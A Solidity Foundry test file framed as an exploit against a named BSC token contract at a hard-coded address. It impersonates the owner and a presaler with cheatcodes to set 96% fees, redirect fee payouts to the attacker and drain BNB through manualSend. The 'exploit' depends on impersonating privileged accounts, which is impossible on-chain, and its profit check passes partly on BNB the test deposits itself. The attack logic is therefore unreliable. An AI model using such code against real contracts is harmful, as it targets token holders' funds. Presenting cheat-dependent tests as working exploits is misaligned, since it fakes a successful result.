// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CryptoRace {
    function getOwner() external view returns (address);
    function setFees(uint256 _liquidityFee, uint256 _buybackFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external;
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function pair() external view returns (address);
    function swapThreshold() external view returns (uint256);
    function manualSend() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x35240D91223186133fCb0EC1565c353eb2A546A8;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate owner in exploit
        vm.label(TARGET, "CRACE Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Impersonate the owner (who is authorized)
        address owner = CryptoRace(TARGET).getOwner();
        vm.startPrank(owner);

        // Step 2: Set extremely high fees (99% total fee)
        // liquidityFee + buybackFee + reflectionFee + marketingFee = 9900 * 4 = 39600
        // But we need to keep totalFee reasonable to avoid overflow
        // Let's set 2400 each (24%) for total of 9600/10000 = 96% fee
        CryptoRace(TARGET).setFees(2400, 2400, 2400, 2400, 10000);

        // Step 3: Set marketing fee receiver to attacker
        CryptoRace(TARGET).setFeeReceivers(owner, attacker); // Keep autoLiquidityReceiver as owner, marketing as attacker

        vm.stopPrank();

        // Step 4: Get some CRACE tokens
        // We need to get tokens from the presaler (0x8dC24A8807AB398b5c8a939288Fb010b7572827D)
        address presaler = 0x8dC24A8807AB398b5c8a939288Fb010b7572827D;
        vm.startPrank(presaler);

        // Get CRACE balance of presaler
        uint256 presalerBalance = CryptoRace(TARGET).balanceOf(presaler);
        // Transfer some to attacker (1% of presaler's balance)
        uint256 transferAmount = presalerBalance / 100;
        CryptoRace(TARGET).transfer(attacker, transferAmount);

        vm.stopPrank();

        // Step 5: Trigger fee collection by transferring tokens
        // First, approve the pair to spend attacker's tokens
        vm.prank(attacker);
        CryptoRace(TARGET).approve(CryptoRace(TARGET).pair(), type(uint256).max);

        // Get pair address
        address pair = CryptoRace(TARGET).pair();

        // Transfer from attacker to pair (selling) to trigger fees
        uint256 attackerBalance = CryptoRace(TARGET).balanceOf(attacker);
        // Transfer half of attacker's balance
        uint256 sellAmount = attackerBalance / 2;

        vm.prank(attacker);
        CryptoRace(TARGET).transfer(pair, sellAmount);

        // Step 6: The contract should now have accumulated fees
        // We need to trigger swapBack if it hasn't happened automatically
        // Check if contract has enough tokens to swap
        uint256 contractBalance = CryptoRace(TARGET).balanceOf(TARGET);
        uint256 swapThreshold = CryptoRace(TARGET).swapThreshold();

        if (contractBalance >= swapThreshold) {
            // Trigger swapBack by calling transfer (not from pair)
            // We can transfer from attacker to another address
            vm.prank(attacker);
            CryptoRace(TARGET).transfer(address(0x123), 1);
        }

        // Step 7: Check attacker's BNB balance increased
        uint256 attackerBNBBalanceAfter = address(attacker).balance;
        // Note: We need to ensure the contract has BNB to distribute
        // We can send some BNB to the contract first to ensure there's something to steal
        // Send 1 BNB to contract
        (bool success, ) = TARGET.call{value: 1 ether}("");
        require(success, "Failed to send BNB to contract");

        // Trigger manualSend as owner to immediately send BNB to marketing fee receiver
        vm.prank(owner);
        CryptoRace(TARGET).manualSend();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

